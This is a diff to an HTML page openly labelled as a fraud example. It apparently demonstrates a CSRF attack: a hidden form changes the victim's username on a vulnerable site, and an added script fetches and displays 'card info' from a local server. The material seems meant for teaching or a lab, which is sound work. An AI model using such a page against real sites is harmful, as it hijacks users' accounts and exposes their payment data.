@@ -2,13 +2,13 @@
 <html lang="en" xmlns="http://www.w3.org/1999/html">
 <head>
     <meta charset="UTF-8">
-    <title>Info</title>
+    <title>Malicious</title>
 </head>
 <body>
 <h1>Example of fraud page</h1>
 <h2>Victim must somehow reach this page previously signed in to the target vulnerable site</h2>
 <h3>There two similar endpoint that change username, but one of them not protected from CSRF attack</h3>
-<form target="_self" method="post" >
+<form target="_self" method="post">
     <label hidden="hidden">
         <input name="username" type="text" value="you_r_haxed">
     </label>
@@ -25,5 +25,20 @@
 </form>
 <img src="https://media4.giphy.com/media/W1GG6RYUcWxoHl3jV9/giphy.gif?cid=ecf05e47clm0tx1se058h72jwnzimv3a3777921eg3fe3tsp&rid=giphy.gif&ct=g">
 <p>Usually form submission is automatic</p>
+
+<button id="get_card_info_btn">Steal card info</button>
+<div id="card_info_display"></div>
+<script>
+  document.getElementById('get_card_info_btn').addEventListener('click', () => {
+    fetch('http://localhost:9000/card') // Replace with your URL
+        .then(response => response.json())
+        .then(data => {
+          document.getElementById('card_info_display').innerText = 'Card number: ' + data.cardInfo;
+        })
+        .catch(error => {
+          document.getElementById('card_info_display').innerText = 'Error: ' + error;
+        });
+  });
+</script>
 </body>
 </html>
